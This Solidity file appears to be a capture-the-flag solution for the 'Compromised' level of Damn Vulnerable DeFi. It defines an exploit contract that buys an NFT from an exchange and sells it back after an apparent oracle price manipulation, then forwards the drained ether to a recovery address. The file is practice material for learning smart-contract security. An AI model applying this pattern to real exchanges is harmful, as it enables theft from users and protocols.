// SPDX-License-Identifier: MIT

import {TrustfulOracle} from "../../src/compromised/TrustfulOracle.sol";
import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleInitializer.sol";
import {Exchange} from "../../src/compromised/Exchange.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract CompromisedExploit {

    TrustfulOracle oracle;
    Exchange exchange;
    DamnValuableNFT nft;
    address recovery;

    constructor(    
        TrustfulOracle _oracle,
        Exchange _exchange,
        DamnValuableNFT _nft,
        address _recovery
    ) payable {
        oracle = _oracle;
        exchange = _exchange;
        nft = _nft;
        recovery = _recovery;
    }

    // step 1
    function buy() public payable returns (uint256 id) {
        return exchange.buyOne{value: msg.value}();
    }

    // step 2
    function sellAndSend(uint256 id, uint256 amount) public {
        nft.approve(address(exchange), id);
        exchange.sellOne(id);
        // 直接转给recovery
        payable(recovery).call{value: amount}("");
    }



    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        return this.onERC721Received.selector;
    }

    receive() external payable{}
}